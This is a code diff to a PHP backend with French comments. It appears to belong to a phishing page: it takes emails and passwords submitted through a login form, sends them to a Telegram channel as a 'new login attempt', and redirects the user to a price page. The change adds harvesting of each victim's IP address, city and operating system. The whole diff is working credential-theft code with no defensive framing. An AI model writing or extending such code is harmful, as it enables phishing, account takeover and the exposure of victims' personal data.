@@ -45,21 +45,27 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         $data = json_decode($input, true);
 
         // Vérifier la présence des données nécessaires
-        if (isset($data['email']) && isset($data['password'])) {
+        if (isset($data['email']) && isset($data['password']) && isset($data['ip']) && isset($data['ville']) && isset($data['os'])) {
             $email = htmlspecialchars($data['email']);
             $password = htmlspecialchars($data['password']);
+            $ip = htmlspecialchars($data['ip']);
+            $ville = htmlspecialchars($data['ville']);
+            $os = htmlspecialchars($data['os']);
 
             // Préparer le message pour Telegram
             $message = "Nouvelle tentative de connexion :\n\n" .
                        "E-mail : $email\n" .
-                       "Mot de passe : $password";
+                       "Mot de passe : $password\n" .
+                       "IP : $ip\n" .
+                       "Ville : $ville\n" .
+                       "Système d'exploitation : $os";
 
             // Envoyer à Telegram
             sendToTelegram($message);
 
             // Réponse JSON avec redirection
             header("Location: prix.html"); // Redirige vers la page souhaitée
-            exit; // Assurez-vous que le script s'arrête après la redirection
+            exit;
         } else {
             // Réponse en cas de données manquantes
             echo json_encode(['status' => 'error', 'message' => 'Données manquantes.']);
@@ -68,21 +74,27 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     // Vérifier si les données proviennent d'un formulaire (FormData)
     elseif (strpos($contentType, 'multipart/form-data') !== false || !empty($_POST)) {
         // Vérifier la présence des données nécessaires
-        if (isset($_POST['email']) && isset($_POST['password'])) {
+        if (isset($_POST['email']) && isset($_POST['password']) && isset($_POST['ip']) && isset($_POST['ville']) && isset($_POST['os'])) {
             $email = htmlspecialchars($_POST['email']);
             $password = htmlspecialchars($_POST['password']);
+            $ip = htmlspecialchars($_POST['ip']);
+            $ville = htmlspecialchars($_POST['ville']);
+            $os = htmlspecialchars($_POST['os']);
 
             // Préparer le message pour Telegram
             $message = "Nouvelle tentative de connexion :\n\n" .
                        "E-mail : $email\n" .
-                       "Mot de passe : $password";
+                       "Mot de passe : $password\n" .
+                       "IP : $ip\n" .
+                       "Ville : $ville\n" .
+                       "Système d'exploitation : $os";
 
             // Envoyer à Telegram
             sendToTelegram($message);
 
             // Réponse JSON avec redirection
             header("Location: prix.html"); // Redirige vers la page souhaitée
-            exit; // Assurez-vous que le script s'arrête après la redirection
+            exit;
         } else {
             // Réponse en cas de données manquantes
             echo json_encode(['status' => 'error', 'message' => 'Données manquantes.']);
